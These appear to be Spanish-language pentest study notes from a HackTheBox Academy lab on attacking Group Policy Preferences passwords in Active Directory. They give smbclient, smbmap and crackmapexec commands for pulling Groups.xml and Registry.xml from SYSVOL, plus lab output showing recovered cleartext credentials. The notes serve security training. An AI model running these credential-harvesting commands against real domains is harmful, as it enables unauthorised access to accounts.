# Group Policy Preferences (GPP) Passwords

- Se puede explotar la forma en que se almacenan y gestionan algunas configs de group policy.
- Cuando se crea una nueva policy se genera un .xml en un share SYSVOL del DC.
- Estos xml pueden tener diversas configs hasta contraseñas.
- Suelen tener cierta protección con criptografía.

## Atacar
- `smbclient //DOMAIN/SYSVOL -U USER`
    - `/Policies/{PolicyGUID}/Machine/Preferences/Groups/`
    - Archivos como: Groups.xml, Drives.xml, ScheduledTasks.xml
- Para desencriptar hay que usar gpp decrypt

## Ejemplo SMB MAP
- `smbmap -H IP -u USER -p PASS`
- `smbmap -H IP -u USER -p PASS -r SYSVOL`
- Para descargar: `smbmap -H IP -u USER -p PASS --download SYSVOL/path/to/groups.xml`

### Locating & Retrieving GPP Passwords with CrackMapExec
```powershell
GNT@htb[/htb]$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

```

### Using CrackMapExec's gpp_autologin Module
```powershell
GNT@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```